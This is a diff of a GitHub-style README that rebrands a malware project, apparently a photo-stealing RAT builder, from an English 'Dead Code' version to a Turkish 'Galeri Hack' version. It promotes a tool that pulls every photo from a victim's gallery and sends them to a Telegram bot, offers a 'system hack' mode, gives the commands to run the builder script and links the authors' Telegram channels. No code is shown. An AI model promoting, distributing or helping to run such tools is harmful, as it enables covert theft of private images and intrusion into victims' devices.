@@ -1,33 +1,28 @@
-# Malware
-Powered By [GhostAttack](https://Telegram.me/Black_Code_22) Team
-Toole Dead Code get Image to send bot Telegram from skript and more ...
+# Galeri Hack
+Powered By [raiderXD](https://Telegram.me/redhackarsiv) Team
+Red Hack Arsiv Tarafindan Yapılmıştır  ...
 
-## Screenshot:
-<img src="https://github.com/deadcode22/Hack-image/blob/main/1.jpg"> <img src="https://github.com/deadcode22/Hack-image/blob/main/2.jpg">
-<img src="https://github.com/deadcode22/Hack-image/blob/main/3.jpg">
 
-### Installation : 
 
-` git clone https://github.com/deadcode22/Hake-image.git `
 
-` cd Hake-image `
+` cd REDHACK-GALER-RAT `
 
 ` python3 Building-Malware.py `
 
 ## Feature : 
-> FAST AND EASY
+> HIZLI VE KOLAY
 
-> Get Full Image
+> BÜTÜN FOTOĞRAFLARI ÇEKER
 
-> Get Skript from bot 
+> BOTA GÖNDERİR
 
-> fully Support 
+> TELEGRAMA KATIL 😁
 
-> Good Design
+> MÜTHİŞ TASARM
 
 ## Used :  
-> 1  == Attack Image 
+> 1  == GALERİ HACK 
 
-> 2  == Attack System 
+> 2  == SİSTEM HACK 
 
-### Support Telegram Channel : [Telegram Dead Code](https://t.me/Black_Code_22)
+### YARDIM İÇİN Telegram Channel : [Telegram Red Hack Arsiv](https://t.me/redhackarsiv)
